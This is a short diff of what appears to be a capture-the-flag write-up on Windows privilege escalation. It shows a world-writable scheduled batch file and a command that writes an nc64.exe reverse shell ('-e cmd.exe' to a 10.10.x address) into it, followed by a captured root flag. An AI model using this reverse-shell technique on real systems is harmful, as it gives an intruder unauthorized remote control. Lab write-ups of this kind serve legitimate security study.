@@ -257,7 +257,7 @@ echo You must run this script as an Administrator!
 :theEnd
 exit
  -
- 
+
 daniel@MARKUP C:\Log-Management>icacls job.bat
 job.bat BUILTIN\Users:(F)
         NT AUTHORITY\SYSTEM:(I)(F)
@@ -306,9 +306,3 @@ daniel@MARKUP C:\Log-Management>echo C:\Log-Management\nc64.exe -e cmd.exe 10.10
  type root.txt
  f574a3e7650cebd8c39784299cb570f8
  
-I could not get it to run I did try to run nc and got this error 
-"This version of C:\Log-Management\nc64.exe is not compatible with the version of Windows you'r
-e running. Check your computer's system information and then contact the software publisher."
-
-
-
